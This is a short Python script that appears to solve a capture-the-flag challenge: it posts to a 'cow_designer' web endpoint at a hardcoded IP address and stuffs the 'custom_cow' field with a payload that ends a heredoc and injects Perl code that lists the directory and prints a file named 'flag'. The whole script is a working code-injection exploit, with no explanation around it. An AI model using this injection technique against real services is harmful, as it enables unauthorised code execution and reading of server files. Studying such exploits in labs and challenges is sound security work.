import requests

url = "http://3.93.128.89:1204/cow_designer"
# url = "http://3.93.128.89:1204/"

data = {
    "message": "",
    "eyes": "",
    "tongue": "",
    "custom_cow": "\nEOC\n print `ls`;\n open (FH, 'flag');\n print <FH>;",
}

r = requests.post(url=url, data=data)
response = r.text
with open("index.html", 'w') as output:
    print(response, file=output)
